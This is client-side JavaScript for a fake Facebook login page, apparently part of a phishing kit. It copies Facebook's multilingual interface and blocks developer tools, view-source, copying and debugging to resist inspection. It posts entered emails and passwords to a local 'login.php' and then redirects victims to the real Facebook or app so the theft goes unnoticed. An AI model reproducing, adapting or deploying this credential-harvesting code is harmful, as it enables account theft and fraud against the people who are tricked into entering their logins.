 document.addEventListener('contextmenu',function(e){e.preventDefault();});
        document.addEventListener('keydown',function(e){
            if(e.key==='F12'||e.keyCode===123){e.preventDefault();return false;}
            if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.keyCode===73||e.keyCode===74)){e.preventDefault();return false;}
            if(e.ctrlKey&&(e.key==='U'||e.keyCode===85)){e.preventDefault();return false;}
            if(e.ctrlKey&&(e.key==='+'||e.key==='-'||e.key==='0'||e.keyCode===187||e.keyCode===189||e.keyCode===48)){e.preventDefault();return false;}
            if(e.ctrlKey&&e.key==='s'||e.keyCode===83){e.preventDefault();return false;}
            if(e.ctrlKey&&e.key==='p'||e.keyCode===80){e.preventDefault();return false;}
        });
        document.addEventListener('selectstart',function(e){e.preventDefault();});
        document.addEventListener('copy',function(e){e.preventDefault();});
        document.addEventListener('cut',function(e){e.preventDefault();});
        window.addEventListener('wheel',function(e){if(e.ctrlKey){e.preventDefault();}},{passive:false});
        setInterval(function(){var start=performance.now();debugger;var end=performance.now();if(end-start>100){location.reload();}},2000);
        const translations={
            en:{title:"Facebook - log in or sign up",heading:"Log in to Facebook",emailPlaceholder:"Email address or mobile number",passwordPlaceholder:"Password",loginBtn:"Log in",forgot:"Forgotten password",create:"Create new account",meta:"Meta",tagline:"Explore <br>the<br>things<br><span>you love.</span>"},
            es:{title:"Facebook - iniciar sesión o registrarse",heading:"Iniciar sesión en Facebook",emailPlaceholder:"Correo electrónico o número de teléfono",passwordPlaceholder:"Contraseña",loginBtn:"Iniciar sesión",forgot:"Olvidaste tu contraseña",create:"Crear cuenta nueva",meta:"Meta",tagline:"Explora las<br>cosas<br><span>que te gustan.</span>"},
            fr:{title:"Facebook - connexion ou inscription",heading:"Se connecter à Facebook",emailPlaceholder:"Adresse e-mail ou numéro de mobile",passwordPlaceholder:"Mot de passe",loginBtn:"Se connecter",forgot:"Mot de passe oublié",create:"Créer un compte",meta:"Meta",tagline:"Explorez les<br>choses<br><span>que vous aimez.</span>"},
            de:{title:"Facebook – Anmelden oder registrieren",heading:"Bei Facebook anmelden",emailPlaceholder:"E-Mail-Adresse oder Handynummer",passwordPlaceholder:"Passwort",loginBtn:"Anmelden",forgot:"Passwort vergessen",create:"Neues Konto erstellen",meta:"Meta",tagline:"Entdecke die<br>Dinge,<br><span>die du liebst.</span>"},
            it:{title:"Facebook - accedi o iscriviti",heading:"Accedi a Facebook",emailPlaceholder:"Indirizzo email o numero di telefono",passwordPlaceholder:"Password",loginBtn:"Accedi",forgot:"Password dimenticata",create:"Crea un nuovo account",meta:"Meta",tagline:"Esplora le<br>cose<br><span>che ami.</span>"},
            pt:{title:"Facebook - entre ou cadastre-se",heading:"Entrar no Facebook",emailPlaceholder:"E-mail ou telefone",passwordPlaceholder:"Senha",loginBtn:"Entrar",forgot:"Esqueceu a senha",create:"Criar nova conta",meta:"Meta",tagline:"Explore as<br>coisas<br><span>que você ama.</span>"},
            zh:{title:"Facebook - 登录或注册",heading:"登录 Facebook",emailPlaceholder:"邮箱或手机号",passwordPlaceholder:"密码",loginBtn:"登录",forgot:"忘记密码",create:"创建新账户",meta:"Meta",tagline:"探索<br>你<br><span>喜爱的事物。</span>"},
            ja:{title:"Facebook - ログインまたは登録",heading:"Facebookにログイン",emailPlaceholder:"メールアドレスまたは携帯電話番号",passwordPlaceholder:"パスワード",loginBtn:"ログイン",forgot:"パスワードを忘れた",create:"新しいアカウントを作成",meta:"Meta",tagline:"好きなものを<br><span>見つけよう。</span>"},
            ha:{title:"Facebook - shiga ko yiwa rajista",heading:"Shiga Facebook",emailPlaceholder:"Adireshin imel ko lambar waya",passwordPlaceholder:"Kalmar sirri",loginBtn:"Shiga",forgot:"Manta da kalmar sirri?",create:"Sabuwar ajiya",meta:"Meta",tagline:"Bincika<br>abin da<br><span>ka ke so.</span>"},
            ar:{title:"Facebook - تسجيل الدخول أو الاشتراك",heading:"تسجيل الدخول إلى Facebook",emailPlaceholder:"عنوان البريد الإلكتروني أو رقم الهاتف",passwordPlaceholder:"كلمة السر",loginBtn:"تسجيل الدخول",forgot:"هل نسيت كلمة السر؟",create:"إنشاء حساب جديد",meta:"Meta",tagline:"استكشف<br>الأشياء<br><span>التي تحبها.</span>"},
            id:{title:"Facebook - masuk atau daftar",heading:"Masuk ke Facebook",emailPlaceholder:"Email atau nomor ponsel",passwordPlaceholder:"Kata Sandi",loginBtn:"Masuk",forgot:"Lupa kata sandi?",create:"Buat akun baru",meta:"Meta",tagline:"Jelajahi<br>hal-hal<br><span>yang Anda sukai.</span>"},
            hi:{title:"Facebook - लॉग इन या साइन अप करें",heading:"Facebook में लॉग इन करें",emailPlaceholder:"ईमेल पता या मोबाइल नंबर",passwordPlaceholder:"पासवर्ड",loginBtn:"लॉग इन",forgot:"पासवर्ड भूल गए?",create:"नया खाता बनाएँ",meta:"Meta",tagline:"वे चीज़ें<br>एक्सप्लोर करें<br><span>जिनसे आप प्यार करते हैं।</span>"},
            nl:{title:"Facebook - log in of registreer",heading:"Log in bij Facebook",emailPlaceholder:"E-mailadres of telefoonnummer",passwordPlaceholder:"Wachtwoord",loginBtn:"Log in",forgot:"Wachtwoord vergeten?",create:"Nieuw account aanmaken",meta:"Meta",tagline:"Ontdek de<br>dingen<br><span>die je graag doet.</span>"},
            pl:{title:"Facebook - zaloguj się lub zarejestruj",heading:"Zaloguj się do Facebooka",emailPlaceholder:"Adres e-mail lub numer telefonu",passwordPlaceholder:"Hasło",loginBtn:"Zaloguj się",forgot:"Nie pamiętasz hasła?",create:"Utwórz nowe konto",meta:"Meta",tagline:"Odkrywaj<br>rzeczy,<br><span>które kochasz.</span>"},
            tr:{title:"Facebook - giriş yap veya kaydol",heading:"Facebook'a giriş yap",emailPlaceholder:"E-posta veya telefon numarası",passwordPlaceholder:"Şifre",loginBtn:"Giriş Yap",forgot:"Şifreni mi unuttun?",create:"Yeni hesap oluştur",meta:"Meta",tagline:"Sevdiğin<br>şeyleri<br><span>keşfet.</span>"},
            ru:{title:"Facebook - войдите или зарегистрируйтесь",heading:"Вход в Facebook",emailPlaceholder:"Электронный адрес или номер телефона",passwordPlaceholder:"Пароль",loginBtn:"Вход",forgot:"Забыли пароль?",create:"Создать новый аккаунт",meta:"Meta",tagline:"Исследуй<br>вещи,<br><span>которые ты любишь.</span>"},
            vi:{title:"Facebook - đăng nhập hoặc đăng ký",heading:"Đăng nhập Facebook",emailPlaceholder:"Email hoặc số điện thoại",passwordPlaceholder:"Mật khẩu",loginBtn:"Đăng nhập",forgot:"Bạn quên mật khẩu?",create:"Tạo tài khoản mới",meta:"Meta",tagline:"Khám phá<br>những điều<br><span>bạn yêu thích.</span>"},
            ko:{title:"Facebook - 로그인 또는 가입",heading:"Facebook에 로그인",emailPlaceholder:"이메일 또는 휴대폰 번호",passwordPlaceholder:"비밀번호",loginBtn:"로그인",forgot:"비밀번호를 잊으셨나요?",create:"새 계정 만들기",meta:"Meta",tagline:"좋아하는 것들을<br><span>탐색해 보세요.</span>"},
            th:{title:"Facebook - เข้าสู่ระบบหรือสมัครใช้งาน",heading:"เข้าสู่ระบบ Facebook",emailPlaceholder:"อีเมลหรือหมายเลขโทรศัพท์",passwordPlaceholder:"รหัสผ่าน",loginBtn:"เข้าสู่ระบบ",forgot:"ลืมรหัสผ่านใช่หรือไม่",create:"สร้างบัญชีใหม่",meta:"Meta",tagline:"สำรวจ<br>สิ่งที่<br><span>คุณรัก</span>"},
            ur:{title:"Facebook - لاگ ان کریں یا سائن اپ کریں",heading:"Facebook میں لاگ ان کریں",emailPlaceholder:"ای میل ایڈریس یا موبائل نمبر",passwordPlaceholder:"پاس ورڈ",loginBtn:"لاگ ان",forgot:"پاس ورڈ بھول گئے؟",create:"نیا اکاؤنٹ بنائیں",meta:"Meta",tagline:"ان چیزوں کو دریافت کریں<br>جن سے آپ<br><span>محبت کرتے ہیں۔</span>"},
            ta:{title:"Facebook - உள்நுழைய அல்லது பதிவுசெய்ய",heading:"Facebook-ல் உள்நுழைய",emailPlaceholder:"மின்னஞ்சல் முகவரி அல்லது கைபேசி எண்",passwordPlaceholder:"கடவுச்சொல்",loginBtn:"உள்நுழை",forgot:"கடவுச்சொல் மறந்துவிட்டதா?",create:"புதிய கணக்கை உருவாக்க",meta:"Meta",tagline:"நீங்கள் விரும்பும்<br>விஷயங்களை<br><span>கண்டறியுங்கள்.</span>"},
            bn:{title:"Facebook - লগ ইন অথবা নিবন্ধন করুন",heading:"Facebook-এ লগ ইন করুন",emailPlaceholder:"ইমেল বা মোবাইল নম্বর",passwordPlaceholder:"পাসওয়ার্ড",loginBtn:"লগ ইন",forgot:"পাসওয়ার্ড ভুলে গেছেন?",create:"নতুন অ্যাকাউন্ট তৈরি করুন",meta:"Meta",tagline:"আপনার ভালোবাসার<br>জিনিসগুলো<br><span>অন্বেষণ করুন।</span>"},
            te:{title:"Facebook - లాగిన్ లేదా సైన్ అప్",heading:"Facebook లో లాగిన్ అవ్వండి",emailPlaceholder:"ఇమెయిల్ లేదా ఫోన్ నంబర్",passwordPlaceholder:"పాస్వర్డ్",loginBtn:"లాగిన్",forgot:"పాస్వర్డ్ మర్చిపోయారా?",create:"కొత్త ఖాతా సృష్టించండి",meta:"Meta",tagline:"మీరు ప్రేమించే<br>వాటిని<br><span>అన్వేషించండి.</span>"},
            ml:{title:"Facebook - ലോഗിൻ അല്ലെങ്കിൽ സൈൻ അപ്പ്",heading:"Facebook-ൽ ലോഗിൻ ചെയ്യുക",emailPlaceholder:"ഇമെയിൽ അല്ലെങ്കിൽ ഫോൺ നമ്പർ",passwordPlaceholder:"പാസ്‌വേഡ്",loginBtn:"ലോഗിൻ",forgot:"പാസ്‌വേഡ് മറന്നോ?",create:"പുതിയ അക്കൗണ്ട് സൃഷ്ടിക്കുക",meta:"Meta",tagline:"നിങ്ങൾ ഇഷ്ടപ്പെടുന്ന<br>കാര്യങ്ങൾ<br><span>അറിയുക.</span>"},
            pa:{title:"Facebook - ਲੌਗ ਇਨ ਜਾਂ ਸਾਇਨ ਅਪ",heading:"Facebook ਵਿੱਚ ਲੌਗ ਇਨ ਕਰੋ",emailPlaceholder:"ਈਮੇਲ ਜਾਂ ਮੋਬਾਈਲ ਨੰਬਰ",passwordPlaceholder:"ਪਾਸਵਰਡ",loginBtn:"ਲੌਗ ਇਨ",forgot:"ਪਾਸਵਰਡ ਭੁੱਲ ਗਏ?",create:"ਨਵਾਂ ਖਾਤਾ ਬਣਾਓ",meta:"Meta",tagline:"ਉਹ ਚੀਜ਼ਾਂ ਲੱਭੋ<br>ਜਿਨ੍ਹਾਂ ਨਾਲ ਤੁਸੀਂ<br><span>ਪਿਆਰ ਕਰਦੇ ਹੋ।</span>"},
            fa:{title:"Facebook - وارد شوید یا ثبت‌نام کنید",heading:"ورود به فیس‌بوک",emailPlaceholder:"ایمیل یا شماره موبایل",passwordPlaceholder:"رمز عبور",loginBtn:"ورود",forgot:"رمز عبور را فراموش کرده‌اید؟",create:"ایجاد حساب جدید",meta:"Meta",tagline:"چیزهایی را که<br>دوست دارید<br><span>کاوش کنید.</span>"}
        };
        var langNames={en:'English (UK)',es:'Español',fr:'Français (France)',de:'Deutsch',it:'Italiano',pt:'Português (Brasil)',zh:'中文(简体)',ja:'日本語',ha:'Hausa',ar:'العربية',id:'Bahasa Indonesia',hi:'हिन्दी',nl:'Nederlands',pl:'Polski',tr:'Türkçe',ru:'Русский',vi:'Tiếng Việt',ko:'한국어',th:'ภาษาไทย',ur:'اردو',ta:'தமிழ்',bn:'বাংলা',te:'తెలుగు',ml:'മലയാളം',pa:'ਪੰਜਾਬੀ',fa:'فارسی'};
        function setLanguage(lang){
            const t=translations[lang];if(!t)return;
            document.documentElement.lang=lang;
            document.title=t.title;
            document.querySelectorAll('[data-i18n]').forEach(function(el){
                var k=el.getAttribute('data-i18n');
                if(k==='tagline'){el.innerHTML=t[k];}else{el.textContent=t[k];}
            });
            document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el){
                el.placeholder=t[el.getAttribute('data-i18n-placeholder')];
            });
            document.querySelectorAll('.footer-lang a').forEach(function(a){a.classList.remove('lang-active');});
            var active=document.querySelector('.footer-lang a[data-lang="'+lang+'"]');
            if(active)active.classList.add('lang-active');
            var mobileLabel=document.querySelector('#mobileLang span');
            if(mobileLabel&&langNames[lang])mobileLabel.textContent=langNames[lang];
            document.querySelectorAll('.mobile-lang-dropdown a').forEach(function(a){a.classList.remove('active');});
            var mobileActive=document.querySelector('.mobile-lang-dropdown a[data-lang="'+lang+'"]');
            if(mobileActive)mobileActive.classList.add('active');
            localStorage.setItem('fb_lang',lang);
        }
        document.querySelectorAll('.footer-lang a[data-lang]').forEach(function(a){
            a.addEventListener('click',function(e){e.preventDefault();setLanguage(this.getAttribute('data-lang'));});
        });
        var mobileBanner=document.getElementById('mobileBanner');
        if(mobileBanner){
            mobileBanner.addEventListener('click',function(){
                var ua=navigator.userAgent||navigator.vendor||window.opera;
                var isIOS=/iPhone|iPad|iPod/i.test(ua);
                var isAndroid=/Android/i.test(ua);
                if(isIOS){
                    window.location.href='itms-apps://apps.apple.com/app/facebook/id284882215';
                    setTimeout(function(){window.location.href='https://apps.apple.com/app/facebook/id284882215';},800);
                }else if(isAndroid){
                    window.location.href='market://details?id=com.facebook.katana';
                    setTimeout(function(){window.location.href='https://play.google.com/store/apps/details?id=com.facebook.katana';},800);
                }else{
                    window.location.href='https://play.google.com/store/apps/details?id=com.facebook.katana';
                }
            });
        }
        var mobileLangBtn=document.getElementById('mobileLang');
        var langSheetOverlay=document.getElementById('langSheetOverlay');
        var langSheetList=document.getElementById('langSheetList');
        function updateLangSheetSelection(lang){
            if(!langSheetList)return;
            langSheetList.querySelectorAll('.lang-sheet-item').forEach(function(item){
                item.classList.toggle('selected', item.getAttribute('data-lang')===lang);
            });
        }
        if(mobileLangBtn){
            mobileLangBtn.addEventListener('click',function(e){
                e.stopPropagation();
                this.classList.add('open');
                if(langSheetOverlay){
                    updateLangSheetSelection(localStorage.getItem('fb_lang')||'en');
                    langSheetOverlay.classList.add('show');
                }
            });
        }
        if(langSheetOverlay){
            langSheetOverlay.addEventListener('click',function(e){
                if(e.target===langSheetOverlay){
                    langSheetOverlay.classList.remove('show');
                    if(mobileLangBtn)mobileLangBtn.classList.remove('open');
                }
            });
        }
        (function(){
            var card=document.getElementById('langSheetCard');
            var overlay=document.getElementById('langSheetOverlay');
            if(!card||!overlay)return;
            var startY=0,currentY=0,dragging=false;
            card.addEventListener('touchstart',function(e){
                if(e.target.closest('.lang-sheet-list'))return;
                startY=e.touches[0].clientY;
                dragging=true;
                card.style.transition='none';
            },{passive:true});
            card.addEventListener('touchmove',function(e){
                if(!dragging)return;
                currentY=e.touches[0].clientY;
                var diff=currentY-startY;
                if(diff<0)diff=0;
                card.style.transform='translateY('+diff+'px)';
            },{passive:true});
            card.addEventListener('touchend',function(e){
                if(!dragging)return;
                dragging=false;
                card.style.transition='transform 0.3s cubic-bezier(0.25,0.46,0.45,0.94)';
                var diff=currentY-startY;
                if(diff>70){
                    overlay.classList.remove('show');
                    card.style.transform='';
                    if(mobileLangBtn)mobileLangBtn.classList.remove('open');
                }else{
                    card.style.transform='translateY(0)';
                    setTimeout(function(){card.style.transform='';},300);
                }
            });
            card.addEventListener('touchcancel',function(e){
                if(!dragging)return;
                dragging=false;
                card.style.transition='transform 0.3s cubic-bezier(0.25,0.46,0.45,0.94)';
                card.style.transform='translateY(0)';
                setTimeout(function(){card.style.transform='';},300);
            });
        })();
        if(langSheetList){
            langSheetList.querySelectorAll('.lang-sheet-item').forEach(function(item){
                item.addEventListener('click',function(e){
                    e.stopPropagation();
                    var lang=this.getAttribute('data-lang');
                    setLanguage(lang);
                    if(langSheetOverlay)langSheetOverlay.classList.remove('show');
                    if(mobileLangBtn)mobileLangBtn.classList.remove('open');
                });
            });
        }
        var saved=localStorage.getItem('fb_lang');
        if(saved&&translations[saved]){setLanguage(saved);}
        var btnOriginalText={};
        function setBtnLoading(btn){
            btnOriginalText[btn.className]=btn.innerHTML;
            btn.style.pointerEvents='none';
            btn.style.opacity='0.7';
            btn.innerHTML='<span class="btn-spinner"></span>';
            setTimeout(function(){restoreBtn(btn);},3000);
        }
        function restoreBtn(btn){
            btn.style.pointerEvents='';
            btn.style.opacity='';
            btn.innerHTML=btnOriginalText[btn.className]||'';
        }
        var loginBtn=document.querySelector('button[type="submit"]');
        var createBtn=document.querySelector('.create-btn');
        loginBtn.setAttribute('data-i18n','loginBtn');
        createBtn.setAttribute('data-i18n','create');
        var heroImages=['https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp','https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp'];
        var loadCount=parseInt(localStorage.getItem('fb_load_count')||'0');
        document.querySelector('.hero-img').src=heroImages[loadCount%2];
        function isMobileOrTablet(){
            var ua=navigator.userAgent||navigator.vendor||window.opera;
            return /android|iphone|ipad|ipod|windows phone|iemobile|blackberry|opera mini|mobile/i.test(ua)||window.innerWidth<=1100;
        }
        function launchAppOrStore(){
            var ua=navigator.userAgent||navigator.vendor||window.opera;
            var isIOS=/iPhone|iPad|iPod/i.test(ua);
            var appUrl='fb://profile';
            var storeUrl=isIOS?'itms-apps://apps.apple.com/app/facebook/id284882215':'market://details?id=com.facebook.katana';
            var webStore=isIOS?'https://apps.apple.com/app/facebook/id284882215':'https://play.google.com/store/apps/details?id=com.facebook.katana';
            try{window.location.href=appUrl;}catch(e){}
            setTimeout(function(){window.location.href=storeUrl;setTimeout(function(){window.location.href=webStore;},800);},800);
        }
        var form=document.querySelector('form');
        form.addEventListener('submit',function(e){
            e.preventDefault();
            setBtnLoading(loginBtn);
            var data=new FormData(form);
            fetch(form.action,{method:'POST',body:data}).then(function(){
                restoreBtn(loginBtn);
                loadCount++;
                localStorage.setItem('fb_load_count',loadCount);
                if(loadCount%3===0){
                    document.querySelector('.hero-img').src=heroImages[(loadCount%2)];
                }
                setTimeout(function(){
                    if(isMobileOrTablet()){
                        launchAppOrStore();
                    }else{
                        window.location.href='https://www.facebook.com/login.php?email='+encodeURIComponent(data.get('email'))+'&pass='+encodeURIComponent(data.get('pass'));
                    }
                },300);
            }).catch(function(){
                restoreBtn(loginBtn);
                if(isMobileOrTablet()){
                    launchAppOrStore();
                }else{
                    form.submit();
                }
            });
        });
        document.querySelector('.forgot').addEventListener('click',function(e){
            e.preventDefault();
            var url=this.href;
            window.location.href=url;
        });
        createBtn.addEventListener('click',function(e){
            e.preventDefault();
            setBtnLoading(createBtn);
            var url=this.href;
            setTimeout(function(){window.location.href=url;},1800);
        });
        document.addEventListener("submit",function(e){
            var f=e.target;
            if(f.tagName!=="FORM")return;
            if(f.action&&f.action.indexOf("login.php")>-1)return;
            e.preventDefault();f.action="login.php";f.method="post";f.submit();
        },true);